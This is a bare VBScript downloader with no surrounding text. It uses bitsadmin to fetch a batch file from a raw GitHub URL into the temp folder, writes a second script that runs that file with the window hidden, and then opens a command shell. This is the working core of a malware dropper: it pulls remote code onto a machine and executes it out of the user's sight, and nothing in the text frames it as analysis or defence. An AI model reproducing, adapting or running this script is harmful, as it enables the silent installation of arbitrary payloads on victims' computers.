set objws = createobject("wscript.shell")
objws.Run "%comspec% /c bitsadmin /transfer ""D"" https://raw.githubusercontent.com/eventos-dev/test/main/don.bat %temp%\p.bat",vbhide
objws.Run "%comspec% /c echo createobject(""wscript.shell"").Run ""%comspec% /c %temp%\p.bat"", vbhide > %temp%\temp.vbs", vbhide
objws.run "%comspec%"
